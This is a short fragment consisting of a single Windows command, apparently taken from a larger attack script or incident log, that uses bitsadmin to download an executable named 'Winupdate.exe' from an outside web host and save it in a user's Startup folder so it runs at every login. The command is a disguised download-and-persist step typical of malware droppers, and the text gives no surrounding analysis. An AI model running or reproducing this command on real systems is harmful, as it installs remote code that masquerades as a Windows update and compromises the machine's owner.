...
bitsadmin /transfer Packages /download /priority foreground https://chat.dfonect.com/Winupdate.exe "C:\Users\yschoi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
